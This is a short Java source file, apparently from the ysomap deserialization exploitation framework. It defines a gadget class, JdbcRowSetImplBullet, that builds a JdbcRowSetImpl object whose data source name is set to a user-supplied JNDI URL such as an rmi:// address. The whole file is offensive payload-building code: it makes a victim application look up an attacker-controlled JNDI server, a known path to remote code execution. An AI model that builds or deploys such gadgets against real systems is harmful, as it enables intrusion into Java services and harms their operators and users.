package ysomap.gadget.bullet.jdk;

import com.sun.rowset.JdbcRowSetImpl;
import ysomap.annotation.Require;
import ysomap.gadget.bullet.Bullet;

/**
 * @author wh1t3P1g
 * @since 2020/3/2
 */
public class JdbcRowSetImplBullet extends Bullet<JdbcRowSetImpl> {

    @Require(name = "jndiURL", detail = "jndi lookup url, like rmi://xxxx")
    public String jndiURL;

    @Override
    public JdbcRowSetImpl getObject() throws Exception {
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName(jndiURL);
        return jdbcRowSet;
    }
}
